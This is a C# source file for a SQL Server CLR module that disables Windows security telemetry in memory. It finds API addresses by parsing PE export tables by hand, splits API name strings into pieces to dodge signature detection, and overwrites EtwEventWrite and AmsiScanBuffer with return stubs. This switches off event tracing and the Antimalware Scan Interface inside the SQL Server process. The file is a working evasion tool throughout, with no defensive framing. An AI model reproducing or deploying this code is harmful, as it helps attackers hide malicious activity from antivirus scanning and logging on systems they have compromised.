using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.SqlServer.Server;

namespace CLR_module
{

    class Patch
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr GetProcAddress(IntPtr UrethralgiaOrc, string HypostomousBuried);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VirtualProtect(IntPtr GhostwritingNard, UIntPtr NontabularlyBankshall, uint YohimbinizationUninscribed, out uint ZygosisCoordination);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr LoadLibrary(string LiodermiaGranulater);



        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName);
        }
        public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
        {
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }
        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
        {
            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
        }
        private static bool is64Bit()
        {
            if (IntPtr.Size == 4)
                return false;

            return true;
        }
        private static byte[] getETWPayload()
        {
            if (!is64Bit())
                return Convert.FromBase64String("whQA");
            return Convert.FromBase64String("ww==");
        }
        private static byte[] getAMSIPayload()
        {
            if (!is64Bit())
                return Convert.FromBase64String("uFcAB4DCGAA=");
            return Convert.FromBase64String("uFcAB4DD");
        }
        private static IntPtr getAMSILocation()
        {
            //GetProcAddress
            IntPtr pGetProcAddress = GetLibraryAddress("kernel32.dll", "GetProcAddress");
            IntPtr pLoadLibrary = GetLibraryAddress("kernel32.dll", "LoadLibraryA");

            GetProcAddress fGetProcAddress = (GetProcAddress)Marshal.GetDelegateForFunctionPointer(pGetProcAddress, typeof(GetProcAddress));
            LoadLibrary fLoadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(LoadLibrary));

            return fGetProcAddress(fLoadLibrary("amsi.dll"), "AmsiScanBuffer");
        }

        private static IntPtr unProtect(IntPtr amsiLibPtr)
        {

            IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");

            VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));

            uint newMemSpaceProtection = 0;
            if (fVirtualProtect(amsiLibPtr, (UIntPtr)getAMSIPayload().Length, 0x40, out newMemSpaceProtection))
            {
                return amsiLibPtr;
            }
            else
            {
                return (IntPtr)0;
            }

        }


        static byte[] GetPatch
        {
            get
            {
                if (is64Bit())
                {
                    return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                }

                return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            }
        }

        private static void PatchETW()
        {
            try
            {
                IntPtr pEtwEventSend = GetLibraryAddress("ntd" + "ll.d" + "ll", "Et"+"wE"+"ven"+"tWr"+"ite");
                IntPtr pVirtualProtect = GetLibraryAddress("ke"+"rn"+"el32."+"dll", "Vir"+"tua"+"lProt"+"ect");

                VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));

                var patch = getETWPayload();
                uint oldProtect;

                if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
                {
                    Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
                    SqlContext.Pipe.Send("[+] Successfully unhooked ETW!");
                }
                else
                {
                    SqlContext.Pipe.Send("[-] Unhooked ETW Failed!");
                }
                fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            }
            catch (Exception es)
            {
                SqlContext.Pipe.Send(es.ToString());
            }
            


        }

        private static void PathAMSI()
        {
            try
            {
                // Load amsi.dll and get location of AmsiScanBuffer
                IntPtr asb = GetLibraryAddress("a"+"ms"+"i."+"dll", "Ams"+"iSc"+"anB"+"uffer");
                IntPtr pVirtualProtect = GetLibraryAddress("ke"+"rn"+"el3"+"2.dll", "Vi"+"rtu"+"alP"+"rot"+"ect");
                var patch = GetPatch;
                uint oldProtect;

                VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));
                // Set region to RWX
                if (fVirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out oldProtect))
                {
                    Marshal.Copy(patch, 0, asb, patch.Length);
                    SqlContext.Pipe.Send("[+] Successfully Patch AMSI!");
                }
                else
                {
                    SqlContext.Pipe.Send("[-] Patch AMSI Failed!");
                }
                // Restore region to RX
                fVirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            }catch (Exception es)
            {
                if (es.ToString().Contains("not found"))
                {
                    SqlContext.Pipe.Send("[*] No dll to patch");
                }
                else
                {
                    SqlContext.Pipe.Send(es.ToString());
                }
            }
            
        }
        public static void StartPatch()
        {
            PatchETW();

            PathAMSI();
        }

    }
}